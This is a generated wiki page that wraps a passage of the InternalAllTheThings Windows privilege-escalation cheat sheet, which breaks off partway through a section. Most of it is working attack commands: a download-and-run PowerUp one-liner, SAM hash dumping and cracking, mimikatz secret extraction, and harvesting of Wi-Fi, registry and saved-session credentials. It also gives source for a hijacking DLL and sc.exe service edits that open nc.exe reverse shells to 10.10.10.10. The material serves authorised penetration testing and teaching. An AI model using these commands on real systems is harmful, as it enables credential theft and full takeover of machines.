---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Windows - Privilege Escalation

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-redteam-escalation-windows-privilege-escalation` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/escalation/windows-privilege-escalation.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Windows - Privilege Escalation](../../topics/redteam/windows-privilege-escalation.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-redteam-escalation-windows-privilege-escalation |
| name | Windows - Privilege Escalation |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/redteam/escalation/windows-privilege-escalation.md |

## Preserved Source Material

````yaml
_body: "# Windows - Privilege Escalation\n\n## Summary\n\n* [Tools](#tools)\n* [Windows Version and Configuration](#windows-version-and-configuration)\n\
  * [User Enumeration](#user-enumeration)\n* [Network Enumeration](#network-enumeration)\n* [Antivirus Enumeration](#antivirus-enumeration)\n\
  * [Default Writable Folders](#default-writable-folders)\n* [EoP - Looting for passwords](#eop---looting-for-passwords)\n\
  \    * [SAM and SYSTEM files](#sam-and-system-files)\n    * [HiveNightmare](#hivenightmare)\n    * [LAPS Settings](#laps-settings)\n\
  \    * [Search for file contents](#search-for-file-contents)\n    * [Search for a file with a certain filename](#search-for-a-file-with-a-certain-filename)\n\
  \    * [Search the registry for key names and passwords](#search-the-registry-for-key-names-and-passwords)\n    * [Passwords\
  \ in unattend.xml](#passwords-in-unattendxml)\n    * [Wifi passwords](#wifi-passwords)\n    * [Sticky Notes passwords](#sticky-notes-passwords)\n\
  \    * [Passwords stored in services](#passwords-stored-in-services)\n    * [Passwords stored in Key Manager](#passwords-stored-in-key-manager)\n\
  \    * [Powershell History](#powershell-history)\n    * [Powershell Transcript](#powershell-transcript)\n    * [Password\
  \ in Alternate Data Stream](#password-in-alternate-data-stream)\n* [EoP - Processes Enumeration and Tasks](#eop---processes-enumeration-and-tasks)\n\
  * [EoP - Incorrect permissions in services](#eop---incorrect-permissions-in-services)\n* [EoP - Windows Subsystem for Linux\
  \ (WSL)](#eop---windows-subsystem-for-linux-wsl)\n* [EoP - Unquoted Service Paths](#eop---unquoted-service-paths)\n* [EoP\
  \ - $PATH Interception](#eop---path-interception)\n* [EoP - Named Pipes](#eop---named-pipes)\n* [EoP - Kernel Exploitation](#eop---kernel-exploitation)\n\
  * [EoP - Microsoft Windows Installer](#eop---microsoft-windows-installer)\n    * [AlwaysInstallElevated](#alwaysinstallelevated)\n\
  \    * [CustomActions](#customactions)\n* [EoP - Insecure GUI apps](#eop---insecure-gui-apps)\n* [EoP - Evaluating Vulnerable\
  \ Drivers](#eop---evaluating-vulnerable-drivers)\n* [EoP - Printers](#eop---printers)\n    * [Universal Printer](#universal-printer)\n\
  \    * [Bring Your Own Vulnerability](#bring-your-own-vulnerability)\n* [EoP - Runas](#eop---runas)\n* [EoP - Abusing Shadow\
  \ Copies](#eop---abusing-shadow-copies)\n* [EoP - From local administrator to NT SYSTEM](#eop---from-local-administrator-to-nt-system)\n\
  * [EoP - Living Off The Land Binaries and Scripts](#eop---living-off-the-land-binaries-and-scripts)\n* [EoP - Impersonation\
  \ Privileges](#eop---impersonation-privileges)\n    * [Restore A Service Account's Privileges](#restore-a-service-accounts-privileges)\n\
  \    * [Meterpreter getsystem and alternatives](#meterpreter-getsystem-and-alternatives)\n    * [RottenPotato (Token Impersonation)](#rottenpotato-token-impersonation)\n\
  \    * [Juicy Potato (Abusing the golden privileges)](#juicy-potato-abusing-the-golden-privileges)\n    * [Rogue Potato\
  \ (Fake OXID Resolver)](#rogue-potato-fake-oxid-resolver))\n    * [EFSPotato (MS-EFSR EfsRpcOpenFileRaw)](#efspotato-ms-efsr-efsrpcopenfileraw))\n\
  \    * [PrintSpoofer (Printer Bug)](#printspoofer-printer-bug)))\n* [EoP - Privileged File Write](#eop---privileged-file-write)\n\
  \    * [DiagHub](#diaghub)\n    * [UsoDLLLoader](#usodllloader)\n    * [WerTrigger](#wertrigger)\n    * [WerMgr](#wermgr)\n\
  * [EoP - Privileged File Delete](#eop---privileged-file-delete)\n* [EoP - Common Vulnerabilities and Exposures](#eop---common-vulnerabilities-and-exposure)\n\
  \    * [MS08-067 (NetAPI)](#ms08-067-netapi)\n    * [MS10-015 (KiTrap0D)](#ms10-015-kitrap0d---microsoft-windows-nt200020032008xpvista7)\n\
  \    * [MS11-080 (adf.sys)](#ms11-080-afdsys---microsoft-windows-xp2003)\n    * [MS15-051 (Client Copy Image)](#ms15-051-client-copy-image---microsoft-windows-20032008782012)\n\
  \    * [MS16-032](#ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64)\n    * [MS17-010 (Eternal Blue)](#ms17-010-eternal-blue)\n\
  \    * [CVE-2019-1388](#cve-2019-1388)\n* [EoP - $PATH Interception](#eop---path-interception)\n* [References](#references)\n\
  \n## Tools\n\n* [PowerSploit's PowerUp](https://github.com/PowerShellMafia/PowerSploit)\n\n    ```powershell\n    powershell\
  \ -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1');\
  \ Invoke-AllChecks\n    ```\n\n* [Watson - Watson is a (.NET 2.0 compliant) C# implementation of Sherlock](https://github.com/rasta-mouse/Watson)\n\
  * [(Deprecated) Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities](https://github.com/rasta-mouse/Sherlock)\n\
  \n    ```powershell\n    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Sherlock.ps1\n\
  \    ```\n\n* [BeRoot - Privilege Escalation Project - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)\n*\
  \ [Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)\n\n    ```powershell\n    ./windows-exploit-suggester.py\
  \ --update\n    ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt \n  \
  \  ```\n\n* [windows-privesc-check - Standalone Executable to Check for Simple Privilege Escalation Vectors on Windows Systems](https://github.com/pentestmonkey/windows-privesc-check)\n\
  * [WindowsExploits - Windows exploits, mostly precompiled. Not being updated.](https://github.com/abatchy17/WindowsExploits)\n\
  * [WindowsEnum - A Powershell Privilege Escalation Enumeration Script.](https://github.com/absolomb/WindowsEnum)\n* [Seatbelt\
  \ - A C# project that performs a number of security oriented host-survey \"safety checks\" relevant from both offensive\
  \ and defensive security perspectives.](https://github.com/GhostPack/Seatbelt)\n\n    ```powershell\n    Seatbelt.exe -group=all\
  \ -full\n    Seatbelt.exe -group=system -outputfile=\"C:\\Temp\\system.txt\"\n    Seatbelt.exe -group=remote -computername=dc.theshire.local\
  \ -computername=192.168.230.209 -username=THESHIRE\\sam -password=\"yum \\\"po-ta-toes\\\"\"\n    ```\n\n* [Powerless -\
  \ Windows privilege escalation (enumeration) script designed with OSCP labs (legacy Windows) in mind](https://github.com/M4ximuss/Powerless)\n\
  * [JAWS - Just Another Windows (Enum) Script](https://github.com/411Hall/JAWS)\n\n    ```powershell\n    powershell.exe\
  \ -ExecutionPolicy Bypass -File .\\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt\n    ```\n\n* [winPEAS - Windows Privilege\
  \ Escalation Awesome Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)\n\
  * [Windows Exploit Suggester - Next Generation (WES-NG)](https://github.com/bitsadmin/wesng)\n\n    ```powershell\n    #\
  \ First obtain systeminfo\n    systeminfo\n    systeminfo > systeminfo.txt\n    # Then feed it to wesng\n    python3 wes.py\
  \ --update-wes\n    python3 wes.py --update\n    python3 wes.py systeminfo.txt\n    ```\n\n* [PrivescCheck - Privilege Escalation\
  \ Enumeration Script for Windows](https://github.com/itm4n/PrivescCheck)\n\n    ```powershell\n    C:\\Temp\\>powershell\
  \ -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck\"\n    C:\\Temp\\>powershell -ep bypass -c \". .\\PrivescCheck.ps1;\
  \ Invoke-PrivescCheck -Extended\"\n    C:\\Temp\\>powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck\
  \ -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML\"\n    ```\n\n## Windows Version and Configuration\n\n```powershell\n\
  systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"\n```\n\nExtract patchs and updates\n\n```powershell\nwmic qfe\n\
  ```\n\nArchitecture\n\n```powershell\nwmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%\n```\n\nList all env variables\n\
  \n```powershell\nset\nGet-ChildItem Env: | ft Key,Value\n```\n\nList all drives\n\n```powershell\nwmic logicaldisk get caption\
  \ || fsutil fsinfo drives\nwmic logicaldisk get caption,description,providername\nGet-PSDrive | where {$_.Provider -like\
  \ \"Microsoft.PowerShell.Core\\FileSystem\"}| ft Name,Root\n```\n\n## User Enumeration\n\nGet current username\n\n```powershell\n\
  echo %USERNAME% || whoami\n$env:username\n```\n\nList user privilege\n\n```powershell\nwhoami /priv\nwhoami /groups\n```\n\
  \nList all users\n\n```powershell\nnet user\nwhoami /all\nGet-LocalUser | ft Name,Enabled,LastLogon\nGet-ChildItem C:\\\
  Users -Force | select Name\n```\n\nList logon requirements; useable for bruteforcing\n\n```powershell\n$env:usernadsc\n\
  net accounts\n```\n\nGet details about a user (i.e. administrator, admin, current user)\n\n```powershell\nnet user administrator\n\
  net user admin\nnet user %USERNAME%\n```\n\nList all local groups\n\n```powershell\nnet localgroup\nGet-LocalGroup | ft\
  \ Name\n```\n\nGet details about a group (i.e. administrators)\n\n```powershell\nnet localgroup administrators\nGet-LocalGroupMember\
  \ Administrators | ft Name, PrincipalSource\nGet-LocalGroupMember Administrateurs | ft Name, PrincipalSource\n```\n\nGet\
  \ Domain Controllers\n\n```powershell\nnltest /DCLIST:DomainName\nnltest /DCNAME:DomainName\nnltest /DSGETDC:DomainName\n\
  ```\n\n## Network Enumeration\n\nList all network interfaces, IP, and DNS.\n\n```powershell\nipconfig /all\nGet-NetIPConfiguration\
  \ | ft InterfaceAlias,InterfaceDescription,IPv4Address\nGet-DnsClientServerAddress -AddressFamily IPv4 | ft\n```\n\nList\
  \ current routing table\n\n```powershell\nroute print\nGet-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex\n\
  ```\n\nList the ARP table\n\n```powershell\narp -A\nGet-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State\n\
  ```\n\nList all current connections\n\n```powershell\nnetstat -ano\n```\n\nList all network shares\n\n```powershell\nnet\
  \ share\npowershell Find-DomainShare -ComputerDomain domain.local\n```\n\nSNMP Configuration\n\n```powershell\nreg query\
  \ HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP /s\nGet-ChildItem -path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SNMP\
  \ -Recurse\n```\n\n## Antivirus Enumeration\n\nEnumerate antivirus on a box with `WMIC /Node:localhost /Namespace:\\\\root\\\
  SecurityCenter2 Path AntivirusProduct Get displayName`\n\n## Default Writable Folders\n\n```powershell\nC:\\Windows\\System32\\\
  Microsoft\\Crypto\\RSA\\MachineKeys\nC:\\Windows\\System32\\spool\\drivers\\color\nC:\\Windows\\System32\\spool\\printers\n\
  C:\\Windows\\System32\\spool\\servers\nC:\\Windows\\tracing\nC:\\Windows\\Temp\nC:\\Users\\Public\nC:\\Windows\\Tasks\n\
  C:\\Windows\\System32\\tasks\nC:\\Windows\\SysWOW64\\tasks\nC:\\Windows\\System32\\tasks_migrated\\microsoft\\windows\\\
  pls\\system\nC:\\Windows\\SysWOW64\\tasks\\microsoft\\windows\\pls\\system\nC:\\Windows\\debug\\wia\nC:\\Windows\\registration\\\
  crmlog\nC:\\Windows\\System32\\com\\dmp\nC:\\Windows\\SysWOW64\\com\\dmp\nC:\\Windows\\System32\\fxstmp\nC:\\Windows\\SysWOW64\\\
  fxstmp\n```\n\n## EoP - Looting for passwords\n\n### SAM and SYSTEM files\n\nThe Security Account Manager (SAM), often Security\
  \ Accounts Manager, is a database file. The user passwords are stored in a hashed format in a registry hive either as a\
  \ LM hash or as a NTLM hash. This file can be found in %SystemRoot%/system32/config/SAM and is mounted on HKLM/SAM.\n\n\
  ```powershell\n# Usually %SYSTEMROOT% = C:\\Windows\n%SYSTEMROOT%\\repair\\SAM\n%SYSTEMROOT%\\System32\\config\\RegBack\\\
  SAM\n%SYSTEMROOT%\\System32\\config\\SAM\n%SYSTEMROOT%\\repair\\system\n%SYSTEMROOT%\\System32\\config\\SYSTEM\n%SYSTEMROOT%\\\
  System32\\config\\RegBack\\system\n```\n\nGenerate a hash file for John using `pwdump` or `samdump2`.\n\n```powershell\n\
  pwdump SYSTEM SAM > /root/sam.txt\nsamdump2 SYSTEM SAM -o sam.txt\n```\n\nEither crack it with `john -format=NT /root/sam.txt`,\
  \ [hashcat](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Hash%20Cracking.md#hashcat)\
  \ or use Pass-The-Hash.\n\n### HiveNightmare\n\n> CVE-2021–36934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM)\
  \ in Windows 10 and 11 as a non-administrator user\n\nCheck for the vulnerability using `icacls`\n\n```powershell\nC:\\\
  Windows\\System32> icacls config\\SAM\nconfig\\SAM BUILTIN\\Administrators:(I)(F)\n           NT AUTHORITY\\SYSTEM:(I)(F)\n\
  \           BUILTIN\\Users:(I)(RX)    <-- this is wrong - regular users should not have read access!\n```\n\nThen exploit\
  \ the CVE by requesting the shadowcopies on the filesystem and reading the hives from it.\n\n```powershell\nmimikatz> token::whoami\
  \ /full\n\n# List shadow copies available\nmimikatz> misc::shadowcopies\n\n# Extract account from SAM databases\nmimikatz>\
  \ lsadump::sam /system:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM /sam:\\\\\
  ?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM\n\n# Extract secrets from SECURITY\nmimikatz>\
  \ lsadump::secrets /system:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM /security:\\\
  \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY\n```\n\n### LAPS Settings\n\nExtract\
  \ `HKLM\\Software\\Policies\\Microsoft Services\\AdmPwd` from Windows Registry.\n\n* LAPS Enabled: AdmPwdEnabled\n* LAPS\
  \ Admin Account Name: AdminAccountName\n* LAPS Password Complexity: PasswordComplexity\n* LAPS Password Length: PasswordLength\n\
  * LAPS Expiration Protection Enabled: PwdExpirationProtectionEnabled\n\n### Search for file contents\n\n```powershell\n\
  cd C:\\ & findstr /SI /M \"password\" *.xml *.ini *.txt\nfindstr /si password *.xml *.ini *.txt *.config 2>nul >> results.txt\n\
  findstr /spin \"password\" *.*\n```\n\nAlso search in remote places such as SMB Shares and SharePoint:\n\n* Search passwords\
  \ in SharePoint: [nheiniger/SnaffPoint](https://github.com/nheiniger/SnaffPoint) (must be compiled first, for referencing\
  \ issue see: [Pull #6](https://github.com/nheiniger/SnaffPoint/pull/6))\n\n```powershell\n# First, retrieve a token\n##\
  \ Method 1: using SnaffPoint binary\n$token = (.\\GetBearerToken.exe https://your.sharepoint.com)\n## Method 2: using AADInternals\n\
  Install-Module AADInternals -Scope CurrentUser\nImport-Module AADInternals\n$token = (Get-AADIntAccessToken -ClientId \"\
  9bc3ab49-b65d-410a-85ad-de819febfddc\" -Tenant \"your.onmicrosoft.com\" -Resource \"https://your.sharepoint.com\")\n\n#\
  \ Second, search on Sharepoint\n## Method 1: using search strings in ./presets dir\n.\\SnaffPoint.exe -u \"https://your.sharepoint.com\"\
  \ -t $token\n## Method 2: using search string in command line\n### -l uses FQL search, see: https://learn.microsoft.com/en-us/sharepoint/dev/general-development/fast-query-language-fql-syntax-reference\n\
  .\\SnaffPoint.exe -u \"https://your.sharepoint.com\" -t $token -l -q \"filename:.config\"\n```\n\n* Search passwords in\
  \ SMB Shares: [SnaffCon/Snaffler](https://github.com/SnaffCon/Snaffler)\n\n### Search for a file with a certain filename\n\
  \n```powershell\ndir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*\nwhere /R C:\\ user.txt\n\
  where /R C:\\ *.ini\n```\n\n### Search the registry for key names and passwords\n\n```powershell\nREG QUERY HKLM /F \"password\"\
  \ /t REG_SZ /S /K\nREG QUERY HKCU /F \"password\" /t REG_SZ /S /K\n\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\\
  Currentversion\\Winlogon\" # Windows Autologin\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\"\
  \ 2>nul | findstr \"DefaultUserName DefaultDomainName DefaultPassword\" \nreg query \"HKLM\\SYSTEM\\Current\\ControlSet\\\
  Services\\SNMP\" # SNMP parameters\nreg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" # Putty clear text proxy\
  \ credentials\nreg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\" # VNC credentials\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\\
  RealVNC\\WinVNC4 /v password\n\nreg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\n```\n\n\
  ### Passwords in unattend.xml\n\nLocation of the unattend.xml files.\n\n```powershell\nC:\\unattend.xml\nC:\\Windows\\Panther\\\
  Unattend.xml\nC:\\Windows\\Panther\\Unattend\\Unattend.xml\nC:\\Windows\\system32\\sysprep.inf\nC:\\Windows\\system32\\\
  sysprep\\sysprep.xml\n```\n\nDisplay the content of these files with `dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml\
  \ *unattend.txt 2>nul`.\n\nExample content\n\n```powershell\n<component name=\"Microsoft-Windows-Shell-Setup\" publicKeyToken=\"\
  31bf3856ad364e35\" language=\"neutral\" versionScope=\"nonSxS\" processorArchitecture=\"amd64\">\n    <AutoLogon>\n    \
  \ <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>\n     <Enabled>true</Enabled>\n     <Username>Administrateur</Username>\n\
  \    </AutoLogon>\n\n    <UserAccounts>\n     <LocalAccounts>\n      <LocalAccount wcm:action=\"add\">\n       <Password>*SENSITIVE*DATA*DELETED*</Password>\n\
  \       <Group>administrators;users</Group>\n       <Name>Administrateur</Name>\n      </LocalAccount>\n     </LocalAccounts>\n\
  \    </UserAccounts>\n```\n\nUnattend credentials are stored in base64 and can be decoded manually with base64.\n\n```powershell\n\
  $ echo \"U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo=\"  | base64 -d \nSecretSecurePassword1234*\n```\n\nThe Metasploit module `post/windows/gather/enum_unattend`\
  \ looks for these files.\n\n### IIS Web config\n\n```powershell\nGet-Childitem –Path C:\\inetpub\\ -Include web.config -File\
  \ -Recurse -ErrorAction SilentlyContinue\n```\n\n```powershell\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\\
  web.config\nC:\\inetpub\\wwwroot\\web.config\n```\n\n### Other files\n\n```bat\n%SYSTEMDRIVE%\\pagefile.sys\n%WINDIR%\\\
  debug\\NetSetup.log\n%WINDIR%\\repair\\sam\n%WINDIR%\\repair\\system\n%WINDIR%\\repair\\software, %WINDIR%\\repair\\security\n\
  %WINDIR%\\iis6.log\n%WINDIR%\\system32\\config\\AppEvent.Evt\n%WINDIR%\\system32\\config\\SecEvent.Evt\n%WINDIR%\\system32\\\
  config\\default.sav\n%WINDIR%\\system32\\config\\security.sav\n%WINDIR%\\system32\\config\\software.sav\n%WINDIR%\\system32\\\
  config\\system.sav\n%WINDIR%\\system32\\CCM\\logs\\*.log\n%USERPROFILE%\\ntuser.dat\n%USERPROFILE%\\LocalS~1\\Tempor~1\\\
  Content.IE5\\index.dat\n%WINDIR%\\System32\\drivers\\etc\\hosts\nC:\\ProgramData\\Configs\\*\nC:\\Program Files\\Windows\
  \ PowerShell\\*\ndir c:*vnc.ini /s /b\ndir c:*ultravnc.ini /s /b\n```\n\n### Wifi passwords\n\nFind AP SSID\n\n```bat\n\
  netsh wlan show profile\n```\n\nGet Cleartext Pass\n\n```bat\nnetsh wlan show profile <SSID> key=clear\n```\n\nOneliner\
  \ method to extract wifi passwords from all the access point.\n\n```batch\ncls & echo. & for /f \"tokens=4 delims=: \" %a\
  \ in ('netsh wlan show profiles ^| find \"Profile \"') do @echo off > nul & (netsh wlan show profiles name=%a key=clear\
  \ | findstr \"SSID Cipher Content\" | find /v \"Number\" & echo.) & @echo on\n```\n\n### Sticky Notes passwords\n\nThe sticky\
  \ notes app stores it's content in a sqlite db located at `C:\\Users\\<user>\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\\
  LocalState\\plum.sqlite`\n\n### Passwords stored in services\n\nSaved session information for PuTTY, WinSCP, FileZilla,\
  \ SuperPuTTY, and RDP using [SessionGopher](https://github.com/Arvanaghi/SessionGopher)\n\n```powershell\nhttps://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1\n\
  Import-Module path\\to\\SessionGopher.ps1;\nInvoke-SessionGopher -AllDomain -o\nInvoke-SessionGopher -AllDomain -u domain.com\\\
  adm-arvanaghi -p s3cr3tP@ss\n```\n\n### Passwords stored in Key Manager\n\n:warning: This software will display its output\
  \ in a GUI\n\n```ps1\nrundll32 keymgr,KRShowKeyMgr\n```\n\n### Powershell History\n\nDisable Powershell history: `Set-PSReadlineOption\
  \ -HistorySaveStyle SaveNothing`.\n\n```powershell\ntype %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\\
  PSReadline\\ConsoleHost_history.txt\ntype C:\\Users\\swissky\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\\
  ConsoleHost_history.txt\ntype $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\ncat (Get-PSReadlineOption).HistorySavePath\n\
  cat (Get-PSReadlineOption).HistorySavePath | sls passw\n```\n\n### Powershell Transcript\n\n```xml\nC:\\Users\\<USERNAME>\\\
  Documents\\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt\nC:\\Transcripts\\<DATE>\\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt\n\
  ```\n\n### Password in Alternate Data Stream\n\n```ps1\nPS > Get-Item -path flag.txt -Stream *\nPS > Get-Content -path flag.txt\
  \ -Stream Flag\n```\n\n## EoP - Processes Enumeration and Tasks\n\n* What processes are running?\n\n    ```powershell\n\
  \    tasklist /v\n    net start\n    sc query\n    Get-Service\n    Get-Process\n    Get-WmiObject -Query \"Select * from\
  \ Win32_Process\" | where {$_.Name -notlike \"svchost*\"} | Select Name, Handle, @{Label=\"Owner\";Expression={$_.GetOwner().User}}\
  \ | ft -AutoSize\n    ```\n\n* Which processes are running as \"system\"\n\n    ```powershell\n    tasklist /v /fi \"username\
  \ eq system\"\n    ```\n\n* Do you have powershell magic?\n\n    ```powershell\n    REG QUERY \"HKLM\\SOFTWARE\\Microsoft\\\
  PowerShell\\1\\PowerShellEngine\" /v PowerShellVersion\n    ```\n\n* List installed programs\n\n    ```powershell\n    Get-ChildItem\
  \ 'C:\\Program Files', 'C:\\Program Files (x86)' | ft Parent,Name,LastWriteTime\n    Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\\\
  SOFTWARE | ft Name\n    ```\n\n* List services\n\n    ```powershell\n    net start\n    wmic service list brief\n    tasklist\
  \ /SVC\n    ```\n\n* Enumerate scheduled tasks\n\n    ```powershell\n    schtasks /query /fo LIST 2>nul | findstr TaskName\n\
  \    schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep \"SYSTEM\\|Task To Run\" | grep -B 1 SYSTEM\n  \
  \  Get-ScheduledTask | where {$_.TaskPath -notlike \"\\Microsoft*\"} | ft TaskName,TaskPath,State\n    ```\n\n* Startup\
  \ tasks\n\n    ```powershell\n    wmic startup get caption,command\n    reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\\
  R\n    reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n    reg query HKCU\\Software\\Microsoft\\Windows\\\
  CurrentVersion\\RunOnce\n    dir \"C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\"\n    dir \"C:\\\
  Documents and Settings\\%username%\\Start Menu\\Programs\\Startup\"\n    ```\n\n## EoP - Incorrect permissions in services\n\
  \n> A service running as Administrator/SYSTEM with incorrect file permissions might allow EoP. You can replace the binary,\
  \ restart the service and get system.\n\nOften, services are pointing to writable locations:\n\n* Orphaned installs, not\
  \ installed anymore but still exist in startup\n* DLL Hijacking\n\n    ```powershell\n    # find missing DLL \n    - Find-PathDLLHijack\
  \ PowerUp.ps1\n    - Process Monitor : check for \"Name Not Found\"\n\n    # compile a malicious dll\n    - For x64 compile\
  \ with: \"x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll\"\n    - For x86 compile with: \"i686-w64-mingw32-gcc\
  \ windows_dll.c -shared -o output.dll\"\n\n    # content of windows_dll.c\n    #include <windows.h>\n    BOOL WINAPI DllMain\
  \ (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {\n        if (dwReason == DLL_PROCESS_ATTACH) {\n            system(\"\
  cmd.exe /k whoami > C:\\\\Windows\\\\Temp\\\\dll.txt\");\n            ExitProcess(0);\n        }\n        return TRUE;\n\
  \    }\n    ```\n\n* PATH directories with weak permissions\n\n    ```powershell\n    $ for /f \"tokens=2 delims='='\" %a\
  \ in ('wmic service list full^|find /i \"pathname\"^|find /i /v \"system32\"') do @echo %a >> c:\\windows\\temp\\permissions.txt\n\
  \    $ for /f eol^=^\"^ delims^=^\" %a in (c:\\windows\\temp\\permissions.txt) do cmd.exe /c icacls \"%a\"\n\n    $ sc query\
  \ state=all | findstr \"SERVICE_NAME:\" >> Servicenames.txt\n    FOR /F %i in (Servicenames.txt) DO echo %i\n    type Servicenames.txt\n\
  \    FOR /F \"tokens=2 delims= \" %i in (Servicenames.txt) DO @echo %i >> services.txt\n    FOR /F %i in (services.txt)\
  \ DO @sc qc %i | findstr \"BINARY_PATH_NAME\" >> path.txt\n    ```\n\nAlternatively you can use the Metasploit exploit :\
  \ `exploit/windows/local/service_permissions`\n\nNote to check file permissions you can use `cacls` and `icacls`\n> icacls\
  \ (Windows Vista +)\n> cacls (Windows XP)\n\nYou are looking for `BUILTIN\\Users:(F)`(Full access), `BUILTIN\\Users:(M)`(Modify\
  \ access) or  `BUILTIN\\Users:(W)`(Write-only access) in the output.\n\n### Example with Windows 10 - CVE-2019-1322 UsoSvc\n\
  \nPrerequisite: Service account\n\n```powershell\nPS C:\\Windows\\system32> sc.exe stop UsoSvc\nPS C:\\Windows\\system32>\
  \ sc.exe config usosvc binPath=\"C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe 10.10.10.10 4444 -e cmd.exe\"\nPS\
  \ C:\\Windows\\system32> sc.exe config UsoSvc binpath= \"C:\\Users\\mssql-svc\\Desktop\\nc.exe 10.10.10.10 4444 -e cmd.exe\"\
  \nPS C:\\Windows\\system32> sc.exe config UsoSvc binpath= \"cmd /C C:\\Users\\nc.exe 10.10.10.10 4444 -e cmd.exe\"\nPS C:\\\
  Windows\\system32> sc.exe qc usosvc\n[SC] QueryServiceConfig SUCCESS\n\nSERVICE_NAME: usosvc\n        TYPE             \
  \  : 20  WIN32_SHARE_PROCESS \n        START_TYPE         : 2   AUTO_START  (DELAYED)\n        ERROR_CONTROL      : 1  \
  \ NORMAL\n        BINARY_PATH_NAME   : C:\\Users\\mssql-svc\\Desktop\\nc.exe 10.10.10.10 4444 -e cmd.exe\n        LOAD_ORDER_GROUP\
  \   : \n        TAG                : 0\n        DISPLAY_NAME       : Update Orchestrator Service\n        DEPENDENCIES \
  \      : rpcss\n        SERVICE_START_NAME : LocalSystem\n\nPS C:\\Windows\\system32> sc.exe start UsoSvc\n```\n\n### Example\
  \ with Windows XP SP1 - upnphost\n\n```powershell\n# NOTE: spaces are mandatory for this exploit to work !\nsc config upnphost\
  \ binpath= \"C:\\Inetpub\\wwwroot\\nc.exe 10.11.0.73 4343 -e C:\\WINDOWS\\System32\\cmd.exe\"\nsc config upnphost obj= \"\
  .\\LocalSystem\" password= \"\"\nsc qc upnphost\nsc config upnphost depend= \"\"\nnet start upnphost\n```\n\nIf it fails\
  \ because of a missing dependency, try the following commands.\n\n```powershell\nsc config SSDPSRV start=auto\nnet start\
  \ SSDPSRV\nnet stop upnphost\nnet start upnphost\n\nsc config upnphost depend=\"\"\n```\n\nUsing [`accesschk`](https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe)\
  \ from Sysinternals or [accesschk-XP.exe - github.com/phackt](https://github.com/phackt/pentest/blob/master/privesc/windows/accesschk-XP.exe)\n\
  \n```powershell\n$ accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula\nRW SSDPSRV\n        SERVICE_ALL_ACCESS\n\
  RW upnphost\n        SERVICE_ALL_ACCESS\n\n$ accesschk.exe -ucqv upnphost\nupnphost\n  RW NT AUTHORITY\\SYSTEM\n       \
